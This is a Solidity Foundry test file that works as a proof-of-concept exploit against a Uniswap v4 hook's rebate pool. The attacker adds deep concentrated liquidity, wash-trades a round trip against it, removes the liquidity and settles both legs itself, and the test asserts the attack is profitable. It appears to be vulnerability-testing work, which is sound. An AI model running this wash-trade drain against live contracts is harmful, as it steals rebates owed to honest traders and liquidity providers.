// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {console2} from "forge-std/console2.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {BalanceDelta} from "v4-core/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "v4-core/types/PoolOperation.sol";
import {TouchstoneFixture} from "ts/test/utils/TouchstoneFixture.sol";
import {Record} from "ts/src/types/Record.sol";
import {Payout} from "ts/src/types/Payout.sol";
import {PoolState} from "ts/src/types/PoolState.sol";
import {PriceLib} from "ts/src/libraries/PriceLib.sol";

/// Wash trading against one's own concentrated liquidity drains the rebate pool: the LP fee the
/// wash trader pays goes mostly back to itself, while the rebate is paid as kappa * f * N.
contract WashRebateDrainTest is TouchstoneFixture {
    using StateLibrary for IPoolManager;

    address attacker = makeAddr("attacker");

    function setUp() public {
        _setUp(18, 6);
        _fund(attacker);
    }

    function _flagged(address who, bool buy, bool exactIn, uint256 amount) internal returns (Record memory r) {
        vm.recordLogs();
        _swap(who, buy, exactIn, amount, "");
        bool found;
        (r, found) = _lastRecord();
        assertTrue(found, "not flagged");
    }

    function _settle(Record memory r, int64 price8, address who) internal returns (Payout memory p) {
        uint64 t0 = uint64(r.timestamp) + 3;
        if (block.timestamp < t0) vm.warp(t0);
        bytes[] memory u = _updateRaw(price8, t0, t0 - 1, 0);
        vm.prank(who, who);
        p = settler.settle(r, u);
    }

    function _poolUsd8() internal view returns (int64) {
        uint256 px36 = PriceLib.poolPriceX36(_poolSqrtPrice(), !quoteIs0);
        // quote base units per risky base unit * 1e36 -> dollars per whole risky * 1e8
        return int64(int256(px36 * 10 ** decRisky * 1e8 / 10 ** decQuote / 1e36));
    }

    function _value(address who, int64 price8) internal view returns (uint256) {
        uint256 q = _balance(quote, who) + ledger.owed(who, quote);
        uint256 rk = _balance(risky, who) + ledger.owed(who, risky);
        return q + rk * uint256(int256(price8)) * 10 ** decQuote / 1e8 / 10 ** decRisky;
    }

    function test_WashAgainstOwnLiquidityDrainsRebatePool() public {
        // 1. Honest arbitrage funds both rebate pools (rho share of retained value).
        vm.roll(block.number + 1);
        Record memory a1 = _flagged(trader, true, true, 400_000 * 10 ** decQuote); // deposit in risky
        _settle(a1, 3_400e8, keeper);
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 60);
        Record memory a2 = _flagged(trader, false, true, 150 * 10 ** decRisky); // deposit in quote
        _settle(a2, 2_700e8, keeper);
        PoolState memory st0 = hook.poolState(id);
        console2.log("rebatePool0 before", st0.rebatePool0);
        console2.log("rebatePool1 before", st0.rebatePool1);

        int64 p8 = _poolUsd8();
        vm.warp(block.timestamp + 60);
        uint256 v0 = _value(attacker, p8);

        // 2. Attacker adds deep liquidity in the one tick-spacing range around the price.
        (, int24 tick,,) = manager.getSlot0(id);
        int24 lower = (tick / TICK_SPACING) * TICK_SPACING;
        if (tick < 0 && tick % TICK_SPACING != 0) lower -= TICK_SPACING;
        ModifyLiquidityParams memory lp = ModifyLiquidityParams({
            tickLower: lower - TICK_SPACING, tickUpper: lower + 2 * TICK_SPACING, liquidityDelta: int256(uint256(liquidity()) * 400), salt: bytes32("jit")
        });
        vm.prank(attacker, attacker);
        lpRouter.modifyLiquidity(key, lp, "");
        console2.log("tick", int256(tick));
        console2.log("lower", int256(lower));
        console2.log("L in range", manager.getLiquidity(id));

        // 3. Round trip: buy N quote exact-in, sell the risky back. Both legs >= nMin so the flow bucket flags.
        vm.roll(block.number + 1);
        uint256 n = 1_000_000 * 10 ** decQuote;
        uint256 rBefore = _balance(risky, attacker);
        Record memory w1 = _flagged(attacker, true, true, n);
        uint256 got = _balance(risky, attacker) - rBefore;
        Record memory w2 = _flagged(attacker, false, true, got);

        // 4. Remove the liquidity (collects the fees the attacker paid to itself).
        lp.liquidityDelta = -lp.liquidityDelta;
        vm.prank(attacker, attacker);
        lpRouter.modifyLiquidity(key, lp, "");

        // 5. Settle both legs at the (unmanipulated) fair price, as the attacker itself (it also takes the tip).
        Payout memory q1 = _settle(w1, p8, attacker);
        Payout memory q2 = _settle(w2, p8, attacker);
        console2.log("p8", uint256(int256(p8)));
        console2.log("w1 before/after", w1.sqrtPriceBeforeX96, w1.sqrtPriceAfterX96);
        console2.log("w2 before/after", w2.sqrtPriceBeforeX96, w2.sqrtPriceAfterX96);
        console2.log("benign", q1.benign, q2.benign);
        console2.log("leg2 refund/toLPs", q2.refund, q2.toLPs);
        assertTrue(q1.benign && q2.benign, "legs benign");

        PoolState memory st1 = hook.poolState(id);
        console2.log("rebatePool0 after ", st1.rebatePool0);
        console2.log("rebatePool1 after ", st1.rebatePool1);
        console2.log("rebate+tip leg1", uint256(q1.rebate) + q1.tip);
        console2.log("rebate+tip leg2", uint256(q2.rebate) + q2.tip);
        uint256 v1 = _value(attacker, p8);
        console2.log("attacker value before (quote units)", v0);
        console2.log("attacker value after  (quote units)", v1);
        assertGt(v1, v0, "wash trade is profitable");
    }
}
